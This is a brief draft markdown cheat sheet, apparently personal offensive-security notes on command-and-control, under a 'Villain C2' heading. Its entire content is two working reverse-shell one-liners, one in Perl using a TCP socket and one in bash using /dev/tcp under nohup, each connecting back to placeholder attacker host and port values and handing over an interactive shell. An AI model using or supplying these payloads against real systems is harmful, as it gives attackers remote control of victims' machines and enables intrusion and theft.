# Command&Control [draft]

## Villain C2

``` perl
# simple perl payload
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"*LHOST*",PeerPort=>*LPORT*,Proto=>"tcp");open(STDIN, "<&", $s);open(STDOUT, ">&", $s);open(STDERR, ">&", $s);exec "/bin/bash"'
```

``` bash
# very simple bash payload
nohup /bin/bash -c 'bash -i >& /dev/tcp/*LHOST*/*LPORT* 0>&1 &'
```
